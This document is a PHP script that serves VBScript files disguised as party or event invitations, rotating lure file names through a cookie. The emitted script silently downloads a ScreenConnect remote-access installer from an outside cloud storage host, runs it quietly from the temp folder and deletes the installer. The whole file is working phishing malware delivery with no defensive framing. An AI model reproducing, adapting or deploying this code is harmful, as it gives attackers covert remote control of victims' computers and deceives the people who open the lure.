<?php
header('Content-Type: text/plain; charset=utf-8');
header('Cache-Control: no-store, no-cache, must-revalidate');

$baseNames = [
    "Party_Invite", "Letter_from_Friend", "Important_Mail", "Formal_Invitation",
    "Event_Invitation", "Invitation_Final", "Special_Invitation_VIP", "Special_letter_VIP",
    "Ceremony_Invite", "RSVP_Invitation_Draft", "Personal_Invite", "Elegant_Invitation_Card",
    "Invitation_Exclusive", "Save_The_Date_Invitation", "Save_The_Date"
];

$cookieName = "inv_used";
$used = isset($_COOKIE[$cookieName]) ? json_decode($_COOKIE[$cookieName], true) : [];
if (!is_array($used)) $used = [];

$available = array_diff($baseNames, $used);
if (empty($available)) {
    $available = $baseNames;
    $used = [];
}

$chosenBase = $available[array_rand($available)];
$random5 = str_pad(rand(10000, 99999), 5, '0', STR_PAD_LEFT);
$chosen = $chosenBase . "_" . $random5 . ".vbs";

$used[] = $chosenBase;
setcookie($cookieName, json_encode(array_unique($used)), time() + (30 * 24 * 60 * 60), "/");

header('Content-Disposition: attachment; filename="' . $chosen . '"');

$scUrl = "https://party.nyc3.cdn.digitaloceanspaces.com/ScreenConnect.ClientSetup%20(1).msi";

echo <<<VBS
' DEBUG VERSION - Logs will show on screen

Dim objShell, objFSO
Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

Sub Log(msg)
    WScript.Echo "[DEBUG] " & msg
End Sub

Call Log("Script started")

Dim u, p, http, strm
u = "$scUrl"
p = objShell.ExpandEnvironmentStrings("%TEMP%\\sc_setup.msi")

Call Log("Downloading from: " & u)

Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", u, False
http.Send

Call Log("HTTP Status: " & http.Status)

If http.Status = 200 Then
    Set strm = CreateObject("ADODB.Stream")
    strm.Type = 1
    strm.Open
    strm.Write http.responseBody
    strm.SaveToFile p, 2
    strm.Close
    Call Log("Downloaded successfully to: " & p)
    
    Call Log("Running installer...")
    objShell.Run """" & p & """ /quiet", 0, True
    WScript.Sleep 3000
    If objFSO.FileExists(p) Then objFSO.DeleteFile p, True
    Call Log("Installer finished")
Else
    Call Log("Download failed - check URL")
End If

Call Log("Script completed")
WScript.Quit
VBS;
?>
